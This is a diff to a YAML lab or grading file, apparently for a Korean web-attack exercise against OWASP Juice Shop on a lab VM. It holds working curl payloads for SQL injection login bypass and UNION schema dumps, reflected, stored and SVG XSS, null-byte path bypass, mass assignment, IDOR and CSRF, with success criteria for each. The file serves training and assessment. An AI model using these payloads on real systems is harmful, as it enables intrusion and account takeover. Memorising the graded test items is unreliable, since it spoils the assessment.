@@ -30,20 +30,21 @@ steps:
     expect: token
     field: stdout
     semantic:
-      intent: 웹 애플리케이션 공격 (Web App Attacks) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: JuiceShop /rest/user/login SQL Injection 인증 우회 — email 필드에 apostrophe OR 1=1-- 페이로드 주입해
+        WHERE 절 tautology 로 첫 사용자(admin)로 로그인 + JWT 획득
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - curl -X POST JSON body 의 email 에 apostrophe·1=1·-- 주입
+      - 응답 JSON 에 authentication.token 키 포함 (JWT 획득 성공)
+      - Prepared Statement 로 방어 가능함 언급
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - curl -X POST -H Content-Type:application/json -d email SQLi payload
+      - Burp Repeater 로 로그인 요청 변조
+      - sqlmap --data --auth-type POST
+      - python requests.post
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(웹 애플리케이션 공격 (Web App Attacks))와 무관한 기법
+      - 일반 이메일/비번으로 로그인 시도만
+      - JWT 토큰 추출 없이 status code 만 확인
+      - SQLi 방어(Prepared Statement) 언급 없음
   target_vm: attacker
   script: "curl -s -X POST http://10.20.30.80:3000/rest/user/login \\\n  -H 'Content-Type: application/json'\
     \ \\\n  -d '{\"email\":\"' OR 1=1--\",\"password\":\"a\"}' \\\n | python3 -m json.tool"
@@ -66,20 +67,21 @@ steps:
     expect: email
     field: stdout
     semantic:
-      intent: 웹 애플리케이션 공격 (Web App Attacks) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: 획득한 JWT Base64URL 디코드 — header.payload.signature 중 payload 만 디코딩해 email·role·iat·exp 클레임
+        확인
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - JWT 를 .으로 분리해 payload 부분 추출
+      - base64.urlsafe_b64decode 로 디코딩 후 JSON 파싱
+      - email 필드와 역할(role 또는 admin 표시) 확인
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - python3 -c import base64, json; ... urlsafe_b64decode
+      - echo <payload> | base64 -d (padding 보정)
+      - jwt_tool -d <token>
+      - jwt.io 붙여넣기
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(웹 애플리케이션 공격 (Web App Attacks))와 무관한 기법
+      - signature 까지 디코딩 시도 (헛된 작업)
+      - JSON 파싱 없이 바이너리 출력만
+      - email/role 필드 해석 없음
   target_vm: attacker
   script: "curl -s -X POST http://10.20.30.80:3000/rest/user/login \\\n  -H 'Content-Type: application/json'\
     \ \\\n  -d '{\"email\":\"' OR 1=1--\",\"password\":\"a\"}' \\\n | python3 -c \"import sys,json,base64;\
@@ -103,20 +105,20 @@ steps:
     expect: iframe
     field: stdout
     semantic:
-      intent: 웹 애플리케이션 공격 (Web App Attacks) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: JuiceShop 검색 엔드포인트 반사형 XSS — <iframe src=javascript:alert(1)> 페이로드 URL 인코딩해서 q 파라미터에 주입
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - curl 로 %3Ciframe%20src%3Djavascript:alert(1)%3E 인코딩된 URL 요청
+      - 응답에 iframe 또는 해당 페이로드 원형 반영(이스케이프 없이)
+      - Reflected XSS 의 세션 탈취·피싱 활용 언급
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - curl -G --data-urlencode q=<payload> <url>
+      - Burp Repeater 로 요청 변조
+      - dalfox url <url>?q=FUZZ
+      - XSStrike / XSSer 자동화
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(웹 애플리케이션 공격 (Web App Attacks))와 무관한 기법
+      - URL 인코딩 없이 원문 전송해 파싱 실패
+      - 응답에서 페이로드 반영 여부 검증 없음
+      - 'iframe/javascript: 대신 단순 alert() 만 시도'
   target_vm: attacker
   script: curl -s 'http://10.20.30.80:3000/rest/products/search?q=<iframe%20src%3D%22javascript:alert(1)%22>'
   risk_level: medium
@@ -140,20 +142,21 @@ steps:
     expect: email
     field: stdout
     semantic:
-      intent: 웹 애플리케이션 공격 (Web App Attacks) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: JuiceShop /api/Users Mass Assignment — 등록 body 에 role:admin 필드 추가해 관리자 권한 계정 생성 (OWASP A01
+        Broken Access Control)
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - curl -X POST /api/Users body 에 role:admin 포함
+      - 응답 JSON 에 등록된 사용자 email 과 role 필드 확인
+      - 서버가 클라이언트 role 입력을 검증 없이 바인딩하는 Mass Assignment 취약점 설명
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - curl POST JSON with role:admin
+      - Burp Repeater 로 필드 추가
+      - python requests.post(url, json={email, password, role:admin})
+      - OWASP API6 Mass Assignment 가이드 참조
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(웹 애플리케이션 공격 (Web App Attacks))와 무관한 기법
+      - role 필드 없이 일반 등록
+      - 생성 후 권한 확인 없이 status 만
+      - Mass Assignment 개념 언급 없음
   target_vm: attacker
   script: "curl -s -X POST http://10.20.30.80:3000/api/Users \\\n  -H 'Content-Type: application/json'\
     \ \\\n  -d '{\"email\":\"hacker@test.com\",\"password\":\"hacker123\",\"passwordRepeat\":\"hacker123\"\
@@ -179,20 +182,20 @@ steps:
     expect: SELECT
     field: stdout
     semantic:
-      intent: 웹 애플리케이션 공격 (Web App Attacks) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: JuiceShop 검색 UNION SELECT SQLi — sqlite_master 테이블 조회로 DB 스키마(테이블 이름·CREATE 문) 추출
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - curl 로 q=...) UNION SELECT 쿼리 주입
+      - 응답에 SELECT 또는 CREATE TABLE 키워드 포함된 스키마 정보
+      - UNION 컬럼 수 매칭(9열)과 sqlite_master 사용 설명
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - curl URL-encoded UNION SELECT FROM sqlite_master
+      - sqlmap -u <url>?q=FUZZ --technique=U --dbms=sqlite
+      - Burp Intruder payload list
+      - 수동 컬럼 수 ORDER BY 탐지 후 UNION
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(웹 애플리케이션 공격 (Web App Attacks))와 무관한 기법
+      - 일반 검색어만 전송
+      - UNION 없이 단순 apostrophe
+      - 컬럼 수 매칭 개념 설명 없음
   target_vm: attacker
   script: curl -s 'http://10.20.30.80:3000/rest/products/search?q=test%27%29%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--'
   risk_level: medium
@@ -219,20 +222,21 @@ steps:
     expect: comment
     field: stdout
     semantic:
-      intent: 웹 애플리케이션 공격 (Web App Attacks) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: JuiceShop /api/Feedbacks 저장형 XSS — 로그인 후 comment 필드에 <script>alert(1)</script> 주입해 DB 저장,
+        다른 사용자 페이지 로드 시 스크립트 실행
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - SQLi 로 토큰 획득 후 Authorization Bearer <token> 로 /api/Feedbacks POST
+      - comment 필드에 <script>alert(1)</script> 포함
+      - 응답 JSON 에 저장된 comment 반영 확인 + Stored XSS 가 Reflected 보다 위험한 이유(영구 노출) 언급
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - curl -X POST -H Auth... -d comment:<payload> /api/Feedbacks
+      - Burp Repeater 로 body 변조
+      - python requests.post(headers,json)
+      - XSSHunter payload 로 외부 콜백
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(웹 애플리케이션 공격 (Web App Attacks))와 무관한 기법
+      - 토큰 없이 POST (401)
+      - payload 전송 후 저장 확인 없음
+      - 저장형/반사형 차이 언급 없음
   target_vm: attacker
   script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json''
     -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
@@ -259,20 +263,21 @@ steps:
     expect: name
     field: stdout
     semantic:
-      intent: 웹 애플리케이션 공격 (Web App Attacks) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: JuiceShop /ftp Null Byte(%2500) 인젝션 — 서버가 .md 확장자만 허용할 때 이중 인코딩된 Null 로 확장자 검증 우회해 .bak
+        파일 다운로드
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - curl 로 /ftp/package.json.bak%2500.md 요청
+      - 응답에 package.json 원본 내용(name/version 키) 포함 또는 이와 동등한 .bak 내용
+      - '%2500 이중 인코딩의 원리(서버 측 디코드 시 Null 출현) 설명'
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - curl -s <url>/ftp/<file>.bak%2500.md
+      - curl -s <url>/ftp/<file>.bak%00.md (1회 인코딩)
+      - Burp Repeater 로 %2500 주입
+      - ffuf 로 확장자 퍼징
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(웹 애플리케이션 공격 (Web App Attacks))와 무관한 기법
+      - '%2500 없이 .md 만 요청'
+      - .bak 파일 내용 확인 없이 종료
+      - Null Byte 원리 설명 없음
   target_vm: attacker
   script: curl -s 'http://10.20.30.80:3000/ftp/package.json.bak%2500.md'
   risk_level: medium
@@ -296,20 +301,20 @@ steps:
     expect: rating
     field: stdout
     semantic:
-      intent: 웹 애플리케이션 공격 (Web App Attacks) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: JuiceShop /api/Feedbacks rating=0 입력 검증 우회 — 클라이언트 min=1 제한을 API 직접 호출로 무시해 0-star 리뷰 제출
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - curl -X POST /api/Feedbacks body 의 rating:0 로 직접 전송
+      - 응답 JSON 에 rating:0 으로 저장된 피드백 확인
+      - 클라이언트 측 검증의 한계·서버 측 검증 필수 원칙 언급
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - curl -X POST -H Auth... -d rating:0
+      - Burp Repeater 로 body 수정
+      - python requests.post(json={rating:0})
+      - POSTman 컬렉션 편집
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(웹 애플리케이션 공격 (Web App Attacks))와 무관한 기법
+      - HTML form 을 통한 제출만 시도 (클라이언트 검증에 막힘)
+      - rating:0 저장 여부 확인 없음
+      - 검증 계층 원리 설명 없음
   target_vm: attacker
   script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json''
     -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
@@ -337,20 +342,21 @@ steps:
     expect: password
     field: stdout
     semantic:
-      intent: 웹 애플리케이션 공격 (Web App Attacks) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: JuiceShop /rest/user/change-password CSRF — GET 메서드로 비번 변경 가능한지 확인 (상태 변경 요청을 GET 으로 허용하면
+        <img src=...> 공격 가능)
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - 토큰 획득 후 curl GET /rest/user/change-password?current=&new=&repeat= 호출
+      - 응답에서 비번 변경 성공/실패 판정
+      - GET 으로 상태 변경 허용 시 CSRF 공격 시나리오(img 태그) 언급
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - curl -G --data-urlencode ... /rest/user/change-password
+      - Authorization Bearer 헤더 + Cookie token 조합
+      - Burp Repeater
+      - python requests.get(params={current, new, repeat})
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(웹 애플리케이션 공격 (Web App Attacks))와 무관한 기법
+      - POST 요청으로 시도 (GET 허용 여부 확인 의도 벗어남)
+      - current 파라미터 없이 시도
+      - CSRF 원리 설명 없음
   target_vm: attacker
   script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json''
     -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
@@ -376,20 +382,21 @@ steps:
     expect: Products
     field: stdout
     semantic:
-      intent: 웹 애플리케이션 공격 (Web App Attacks) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: JuiceShop /rest/basket/<id> IDOR — 본인 basket 아닌 id=2 (타 사용자) 로 요청해 타 사용자 장바구니 조회 (OWASP
+        API1 BOLA)
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - 토큰 획득 후 curl 로 /rest/basket/2 (또는 /1) GET
+      - 응답 JSON 에 Products 배열 또는 타 사용자 장바구니 데이터 확인
+      - 서버가 소유권 검증 안함 → IDOR/BOLA 판정
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - curl -H Auth... /rest/basket/<other_id>
+      - for id in 1 2 3; do curl ...; done (열거)
+      - Burp autorize extension 자동 테스트
+      - ffuf -u /rest/basket/FUZZ -w ids.txt
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(웹 애플리케이션 공격 (Web App Attacks))와 무관한 기법
+      - 본인 basket 만 조회
+      - 401 응답만 받고 판정 없음
+      - IDOR/BOLA 개념 언급 없음
   target_vm: attacker
   script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json''
     -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
@@ -414,20 +421,20 @@ steps:
     expect: description
     field: stdout
     semantic:
-      intent: 웹 애플리케이션 공격 (Web App Attacks) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: JuiceShop /api/Products/1 PUT 메서드 무권한 수정 — 일반 사용자 토큰으로 관리자 리소스 변경 (Broken Access Control)
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - curl -X PUT /api/Products/1 body 에 description 변조
+      - 응답 JSON 에 수정된 description 반영
+      - HTTP 메서드별 인가 검증 누락이 BFLA(Broken Function Level Auth) 임을 설명
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - curl -X PUT -H Auth... -d description:<text>
+      - curl -X PATCH (일부 필드만)
+      - Burp Repeater 로 메서드 변경
+      - python requests.put
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(웹 애플리케이션 공격 (Web App Attacks))와 무관한 기법
+      - GET 으로만 시도 (수정 확인 불가)
+      - 수정 결과 확인 없이 상태 코드만
+      - 관리자 권한 경로 차이 언급 없음
   target_vm: attacker
   script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json''
     -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
@@ -454,20 +461,20 @@ steps:
     expect: svg
     field: stdout
     semantic:
-      intent: 웹 애플리케이션 공격 (Web App Attacks) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: SVG 업로드 XSS — XML 기반 SVG 의 onload 이벤트 핸들러에 alert(1) 삽입한 파일을 /profile/image/file 에 업로드
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - echo 또는 cat 으로 SVG 파일(onload=alert(1)) 생성
+      - curl -F file=@<svg>;type=image/svg+xml 로 업로드
+      - 응답에 svg 키워드 또는 업로드된 이미지 경로 + 렌더링 시 스크립트 실행 위험 언급
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - echo ... > /tmp/xss.svg && curl -F file=@/tmp/xss.svg
+      - heredoc 으로 SVG 생성
+      - Burp Repeater 로 multipart 변조
+      - 'python requests.post files={file: (name, content, mime)}'
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(웹 애플리케이션 공격 (Web App Attacks))와 무관한 기법
+      - 일반 PNG/JPG 만 업로드
+      - onload 이벤트 없이 SVG 정적 이미지만
+      - MIME type 검증 우회 원리 설명 없음
   target_vm: attacker
   script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json''
     -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
@@ -496,20 +503,21 @@ steps:
     expect: script
     field: stdout
     semantic:
-      intent: 웹 애플리케이션 공격 (Web App Attacks) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: HTTP 헤더 인젝션 — /rest/saveLoginIp 에 True-Client-IP 또는 X-Forwarded-For 헤더로 <script> 페이로드 주입,
+        서버가 검증 없이 DB 저장 시 Stored XSS
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - 'curl -H True-Client-IP: <script> 또는 X-Forwarded-For 헤더 변조 후 /rest/saveLoginIp 호출'
+      - 응답 또는 후속 로그에 주입된 스크립트 반영
+      - 헤더는 신뢰 불가한 입력임을 언급
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - curl -H True-Client-IP:<payload> <url>
+      - curl -H X-Forwarded-For:<payload>
+      - Burp Repeater 로 헤더 변조
+      - python requests headers={...}
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(웹 애플리케이션 공격 (Web App Attacks))와 무관한 기법
+      - 헤더 변조 없이 일반 요청
+      - 페이로드 반영 여부 검증 없음
+      - 헤더 기반 공격의 신뢰 경계 설명 없음
   target_vm: attacker
   script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json''
     -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
@@ -536,20 +544,20 @@ steps:
     expect: html
     field: stdout
     semantic:
-      intent: 웹 애플리케이션 공격 (Web App Attacks) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: JuiceShop /administration 관리자 패널 직접 접근 — 프론트엔드 라우팅 제한만 있고 백엔드 인가 없을 때 URL 직접 호출로 우회
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - curl -H Auth... /administration 요청
+      - 응답이 HTML 페이지이면 서버측 인가 없이 관리자 리소스 반환 확인
+      - Frontend-only 인가의 보안 한계·서버 측 RBAC 필요성 언급
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - 'curl -s /administration -H Authorization: Bearer ...'
+      - 브라우저 직접 URL 입력
+      - Burp Repeater 로 경로 변조
+      - python requests.get
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(웹 애플리케이션 공격 (Web App Attacks))와 무관한 기법
+      - 프론트엔드 Angular 루트로만 접근 시도
+      - HTML 응답 여부 확인 없음
+      - 서버 측 인가 원칙 언급 없음
   target_vm: attacker
   script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json''
     -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
@@ -576,20 +584,21 @@ steps:
     expect: Web Attack Report
     field: stdout
     semantic:
-      intent: 웹 애플리케이션 공격 (Web App Attacks) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: 수행한 웹 공격을 OWASP Top 10 2021 카테고리별로 분류한 리포트 작성 (/tmp/web_attack_report.txt) — A01 Broken
+        Access Control, A03 Injection, A05 Security Misconfig 등
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - OWASP A01~A10 중 실습에서 발견한 3개 이상 카테고리에 발견사항 매핑
+      - 각 카테고리별 구체적 취약점 예시 1개 이상 (SQLi, Mass Assignment, Stored XSS, IDOR 등)
+      - 파일 저장 후 cat 으로 내용 확인
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - heredoc > /tmp/web_attack_report.txt
+      - echo -e 다줄
+      - python jinja2 템플릿
+      - OWASP Top 10 공식 매트릭스 참조
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(웹 애플리케이션 공격 (Web App Attacks))와 무관한 기법
+      - OWASP Top 10 매핑 없이 기법 나열만
+      - 카테고리 2개 이하
+      - 파일 저장 없이 화면 출력만
   target_vm: attacker
   script: 'echo -e ''=== Web Attack Report ===\n\n[A01: Broken Access Control]\n- IDOR: /rest/basket/2
     접근\n- Admin panel 직접 접근\n- Mass Assignment: role=admin\n\n[A03: Injection]\n- SQL Injection: login
